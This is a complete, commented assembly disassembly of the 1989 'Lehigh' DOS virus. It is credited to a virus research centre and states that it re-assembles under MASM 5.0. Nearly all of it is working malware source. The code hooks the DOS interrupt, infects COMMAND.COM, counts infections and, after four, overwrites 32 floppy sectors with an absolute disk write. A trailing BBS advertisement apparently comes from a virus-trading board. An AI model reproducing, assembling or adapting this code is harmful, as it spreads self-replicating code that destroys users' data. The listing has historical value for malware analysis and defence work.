	page	65,132
	title	The 'Lehigh' Virus
; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º                 British Computer Virus Research Centre                   º
; º  12 Guildford Street,   Brighton,   East Sussex,   BN1 3LS,   England    º
; º  Telephone:     Domestic   0273-26105,   International  +44-273-26105    º
; º                                                                          º
; º                            The 'Lehigh' Virus                            º
; º                Disassembled by Joe Hirst,   July     1989                º
; º                                                                         º
; º                       Copyright (c) Joe Hirst 1989.                      º
; º                                                                          º
; º      This listing is only to be made available to virus researchers      º
; º                or software writers on a need-to-know basis.              º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼

	; The disassembly has been tested by re-assembly using MASM 5.0.

CODE	SEGMENT BYTE PUBLIC 'CODE'
	ASSUME CS:CODE,DS:CODE

	; Interrupt 21H routine

BP0010:	PUSH	AX
	PUSH	BX
	CMP	AH,4BH			; Load function?
	JE	BP0020			; Branch if yes
	CMP	AH,4EH			; Find file file?
	JE	BP0020			; Branch if yes
	JMP	BP0170			; Pass interrupt on

	; Load or find file function

BP0020:	MOV	BX,DX			; Get pathname pointer
	CMP	BYTE PTR [BX+1],':'	; Is a disk specified?
	JNE	BP0030			; Branch if not
	MOV	AL,[BX]			; Get disk letter
	JMP	BP0040

	; Is there a COMMAND.COM on disk?

BP0030:	MOV	AH,19H			; Get current disk function
	INT	44H			; DOS service (diverted INT 21H)
	ADD	AL,'a'			; Convert to letter
BP0040:	PUSH	DS
	PUSH	CX
	PUSH	DX
	PUSH	DI
	PUSH	CS			; \ Set DS to CS
	POP	DS			; /
	MOV	BX,OFFSET PATHNM	; Address pathname
	MOV	[BX],AL			; Store disk letter in pathname
	MOV	DX,BX			; Move pathname address
	MOV	AX,3D02H		; Open handle (R/W) function
	INT	44H			; DOS service (diverted INT 21H)
	JNB	BP0050			; Branch if no error
	JMP	BP0160			; Restore registers and terminate

	; Is COMMAND.COM infected?

BP0050:	MOV	BX,AX			; Move file handle
	MOV	AX,4202H		; Move file pointer function (EOF)
	XOR	CX,CX			; \ No offset
	MOV	DX,CX			; /
	INT	44H			; DOS service (diverted INT 21H)
	MOV	DX,AX			; Copy file length
	MOV	FILELN,AX		; Save file length
	SUB	DX,2			; Address last word of file
	MOV	AX,4200H		; Move file pointer function (start)
	INT	44H			; DOS service (diverted INT 21H)
	MOV	DX,OFFSET BUFFER	; Address read buffer
	MOV	CX,2			; Length to read
	MOV	AH,3FH			; Read handle function
	INT	44H			; DOS service (diverted INT 21H)
	CMP	WORD PTR BUFFER,65A9H	; Is file infected?
	JNE	BP0060			; Branch if not
	JMP	BP0080

	; Infect COMMAND.COM

BP0060:	XOR	DX,DX			; \ No offset
	MOV	CX,DX			; /
	MOV	AX,4200H		; Move file pointer function (start)
	INT	44H			; DOS service (diverted INT 21H)
	MOV	CX,3			; Length to read
	MOV	DX,OFFSET BUFFER	; Address read buffer
	MOV	DI,DX			; Copy address
	MOV	AH,3FH			; Read handle function
	INT	44H			; DOS service (diverted INT 21H)
	MOV	AX,[DI+1]		; Get displacement from initial jump
	ADD	AX,0103H		; Convert to address for COM file
	MOV	ENTPTR,AX		; Save file entry address
	MOV	DX,FILELN		; Get file length
	SUB	DX,OFFSET ENDADR	; Subtract length of virus
	DEC	DX			; ...and one more
	MOV	[DI],DX			; Put offset into jump instruction
	XOR	CX,CX			; Clear high offset for move
	MOV	AX,4200H		; Move file pointer function (start)
	INT	44H			; DOS service (diverted INT 21H)
	MOV	AL,INFCNT		; Get infection count
	PUSH	AX			; Preserve infection count
	MOV	BYTE PTR INFCNT,0	; Set infection count to zero
	MOV	CX,OFFSET ENDADR	; \ Get length of virus
	INC	CX			; /
	XOR	DX,DX			; Address start of virus
	MOV	AH,40H			; Write handle function
	INT	44H			; DOS service (diverted INT 21H)
	POP	AX			; Recover infection count
	MOV	INFCNT,AL		; Restore original infection count
	XOR	CX,CX			; \ Address second byte of program
	MOV	DX,1			; /
	MOV	AX,4200H		; Move file pointer function (start)
	INT	44H			; DOS service (diverted INT 21H)
	MOV	AX,[DI]			; Get virus offset
	ADD	AX,OFFSET BP0180	; Add entry point
	SUB	AX,3			; Subtract length of jump instruction
	MOV	[DI],AX			; Replace offset
	MOV	DX,DI			; Address stored offset
	MOV	CX,2			; Length to write
	MOV	AH,40H			; Write handle function
	INT	44H			; DOS service (diverted INT 21H)
	INC	BYTE PTR INFCNT		; Increment infection count
	CMP	BYTE PTR INFCNT,4	; Have we reached target?
	JB	BP0070			; Branch if not
	JMP	BP0110			; Trash disk

	; Is disk A or B?

BP0070:	MOV	BYTE PTR N_AORB,0	; Set off "not A or B" switch
	CMP	BYTE PTR CURDSK,2	; Is current disk A or B?
	JB	BP0080			; Branch if yes
	MOV	BYTE PTR N_AORB,1	; Set on "not A or B" switch
BP0080:	MOV	AH,3EH			; Close handle function
	INT	44H			; DOS service (diverted INT 21H)
	CMP	BYTE PTR N_AORB,1	; Is "not A or B" switch on?
	JE	BP0090			; Branch if yes
	JMP	BP0160			; Restore registers and terminate

	; Disk not A or B

BP0090:	MOV	BYTE PTR N_AORB,0	; Set off "not A or B" switch
	MOV	BX,OFFSET PATHNM	; Address pathname
	MOV	AL,CURDSK		; Get current disk
	ADD	AL,'a'			; Convert to letter
	MOV	[BX],AL			; Store letter in pathname
	MOV	DX,BX			; Move pathname address
	MOV	AX,3D02H		; Open handle (R/W) function
	INT	44H			; DOS service (diverted INT 21H)
	JNB	BP0100			; Branch if no error
	JMP	BP0160			; Restore registers and terminate

	; Set infection count same as in current program

BP0100:	MOV	BX,AX
	MOV	AX,4202H		; Move file pointer function (EOF)
	XOR	CX,CX			; \ No offset
	MOV	DX,CX			; /
	INT	44H			; DOS service (diverted INT 21H)
	MOV	DX,AX			; \ Address back to infection count
	SUB	DX,7			; /
	MOV	AX,4200H		; Move file pointer function (start)
	INT	44H			; DOS service (diverted INT 21H)
	MOV	CX,1			; Length to write
	MOV	DX,OFFSET INFCNT	; Address infection count
	MOV	AH,40H			; Write handle function
	INT	44H			; DOS service (diverted INT 21H)
	MOV	AH,3EH			; Close handle function
	INT	44H			; DOS service (diverted INT 21H)
	JMP	BP0160			; Restore registers and terminate

	; Trash disk

BP0110:	MOV	AL,CURDSK		; Get current disk
	CMP	AL,2			; Is disk A or B?
	JNB	BP0150			; Branch if not
	MOV	AH,19H			; Get current disk function
	INT	44H			; DOS service (diverted INT 21H)
	MOV	BX,OFFSET PATHNM	; Address pathname
	MOV	DL,[BX]			; Get drive letter from pathname
	CMP	DL,'A'			; Is drive letter 'A'?
	JE	BP0120			; Branch if yes
	CMP	DL,'a'			; Is drive letter 'a'?
	JE	BP0120			; Branch if yes
	CMP	DL,'b'			; Is drive letter 'b'?
	JE	BP0130			; Branch if yes
	CMP	DL,'B'			; Is drive letter 'B'?
	JE	BP0130			; Branch if yes
	JMP	BP0160			; Restore registers and terminate

	; Drive A

BP0120:	MOV	DL,0			; Set drive A
	JMP	BP0140

	; Drive B

BP0130:	MOV	DL,1			; Set drive B
BP0140:	CMP	AL,DL			; Is this the same as current?
	JNE	BP0150			; Branch if not
	JMP	BP0160			; Restore registers and terminate

	; Write lump of BIOS to floppy disk

BP0150:	MOV	SI,0FE00H		; \ Address BIOS (?)
	MOV	DS,SI			; /
	MOV	CX,0020H		; Write 32 sectors
	MOV	DX,1			; Start at sector one
	INT	26H			; Absolute disk write
	POPF
	MOV	AH,9			; Display string function
	MOV	DX,1840H
	INT	44H			; DOS service (diverted INT 21H)
BP0160:	POP	DI
	POP	DX
	POP	CX
	POP	DS
BP0170:	POP	BX
	POP	AX
	JMP	CS:INT_21		; Branch to original Int 21H

	; Original Int 21H vector

INT_21	EQU	THIS DWORD
	DW	138DH			; Int 21H offset
	DW	0295H			; Int 21H segment

	; Entry point for infected program

BP0180:	CALL	BP0190			; \ Get current address
BP0190:	POP	SI			; /
	SUB	SI,3			; Address back to BP0180
	MOV	BX,SI			; \ Address of virus start
	SUB	BX,OFFSET BP0180	; /
	PUSH	BX			; Save address of virus start
	ADD	BX,OFFSET FILELN	; Address file length
	MOV	AH,19H			; Get current disk function
	INT	21H			; DOS service
	MOV	[BX-1],AL		; Save current disk
	MOV	AX,[BX]			; Get file length
	ADD	AX,0100H		; Add PSP length
	MOV	CL,4			; \ Convert to paragraphs
	SHR	AX,CL			; /
	INC	AX			; Allow for remainder
	MOV	BX,AX			; Copy paragraphs to keep
	MOV	AH,4AH			; Set block function
	INT	21H			; DOS service
	JNB	BP0200			; Branch if no error
	JMP	BP0220			; Pass control to host

	; Allocate memory for virus

BP0200:	MOV	CL,4			; Bits to move
	MOV	DX,OFFSET ENDADR	; Length of virus
	SHR	DX,CL			; Convert to paragraphs
	INC	DX			; Allow for remainder
	MOV	BX,DX			; Copy paragraphs for virus
	MOV	AH,48H			; Allocate memory function
	INT	21H			; DOS service
	JNB	BP0210			; Branch if no error
	JMP	BP0220			; Pass control to host

	; Install virus in memory

BP0210:	PUSH	ES
	PUSH	AX			; Preserve allocated memory segment
	MOV	AX,3521H		; Get Int 21H function
	INT	21H			; DOS service
	MOV	[SI-4],BX		; Save Int 21H offset
	MOV	[SI-2],ES		; Save Int 21H segment
	POP	ES			; Recover allocated memory segment
	PUSH	SI
	SUB	SI,OFFSET BP0180	; Address back to start of virus
	XOR	DI,DI			; Target start of new area
	MOV	CX,OFFSET ENDADR	; \ Length of virus
	INC	CX			; /
	REPZ	MOVSB			; Copy virus to new area
	POP	SI
	PUSH	DS
	MOV	DX,[SI-4]		; Get Int 21H offset
	MOV	AX,[SI-2]		; \ Set DS to Int 21H segment
	MOV	DS,AX			; /
	MOV	AX,2544H		; Set Int 44H function
	INT	21H			; DOS service
	PUSH	ES			; \ Set DS to ES
	POP	DS			; /
	XOR	DX,DX			; Interrupt 21H routine (BP0010)
	MOV	AX,2521H		; Set Int 21H function
	INT	44H			; DOS service (diverted INT 21H)
	POP	DS
	POP	ES
BP0220:	POP	BX
	PUSH	ENTPTR[BX]		; Push COM file entry address
	RET				; ...and return to it

PATHNM	DB	'b:\command.com', 0	; Pathname
BUFFER	DB	7FH, 58H, 0BH, 0, 0	; Read buffer
ENTPTR	DW	0CB0H			; File entry address
N_AORB	DB	0			; "Not A or B" switch
INFCNT	DB	0			; Infection count
	DB	0
CURDSK	DB	0			; Current disk
FILELN	DW	5AAAH			; File length
	DW	65A9H			; Infection indicator

ENDADR	EQU	$-1

CODE	ENDS

	END

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ> and Remember Don't Forget to Call <ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄ> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <ÄÄÄÄÄÄÄÄÄÄ
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

